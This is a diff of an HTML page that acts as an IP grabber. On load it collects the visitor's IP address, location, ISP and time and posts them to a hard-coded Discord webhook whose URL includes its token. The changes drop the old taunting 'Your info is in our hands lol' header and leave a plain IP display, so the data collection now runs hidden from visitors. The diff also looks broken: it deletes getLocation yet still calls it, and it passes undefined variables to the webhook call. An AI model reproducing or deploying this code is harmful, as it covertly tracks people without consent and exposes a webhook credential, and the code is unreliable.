@@ -9,70 +9,37 @@
           .then((data) => {
             const ipElement = document.getElementById("ip");
             ipElement.textContent = data.ip;
-
             getLocation(data.ip);
+
+            const pageUserID = Date.now(); // Generate a unique pageUserID based on the current timestamp
+            localStorage.setItem("pageUserID", pageUserID); // Store the pageUserID in localStorage
+            sendToWebhook(data.ip, location, isp, time, pageUserID); // Send the pageUserID along with other data to the webhook
           })
           .catch((error) => {
             console.error("Error:", error);
           });
       }
 
-      function sendToWebhook(ip, location, isp, time) {
+      function sendToWebhook(ip, location, isp, time, pageUserID) {
         const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-        const message = "IP: " + ip + "\nLocation: " + location + "\nISP: " + isp + "\nTime: " + time;
-
+        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID; // Include the pageUserID in the message
         fetch(webhookURL, {
           method: "POST",
           headers: {
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
           },
-          body: JSON.stringify({ content: message })
+          body: JSON.stringify({ content: message }),
         })
-          .then((response) => console.log("Webhook sent successfully"))
-          .catch((error) => console.error("Error sending webhook:", error));
-      }
-
-      function getLocation(ip) {
-        const locationUrl = `https://ipapi.co/${ip}/json/`;
-
-        fetch(locationUrl)
-          .then((response) => response.json())
-          .then((data) => {
-            const locationElement = document.getElementById("location");
-            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
-            locationElement.textContent = locationString;
-
-            const ispElement = document.getElementById("isp");
-            const ispString = data.org;
-            ispElement.textContent = ispString;
-
-            const time = getCurrentTime();
-            sendToWebhook(ip, locationString, ispString, time);
+          .then((response) => {
+            console.log("Success:", response);
           })
           .catch((error) => {
             console.error("Error:", error);
-            const defaultLocation = "Unknown";
-            const defaultIsp = "Unknown";
-            const defaultTime = getCurrentTime();
-            sendToWebhook(ip, defaultLocation, defaultIsp, defaultTime);
           });
-      }
-
-      function getCurrentTime() {
-        const now = new Date();
-        const options = { timeZone: "Europe/Paris" };
-        const timeString = now.toLocaleTimeString("en-US", options);
-        return timeString;
       }
     </script>
   </head>
   <body onload="displayIP()">
-    <h1>Your info is in our hands lol, what we have from you:</h1>
-    <h1>Your IP Address:</h1>
-    <p id="ip">Loading...</p>
-    <h1>Your Location:</h1>
-    <p id="location">Loading...</p>
-    <h1>Your ISP:</h1>
-    <p id="isp">Loading...</p>
+    <p>Your IP address is: <span id="ip"></span></p>
   </body>
 </html>
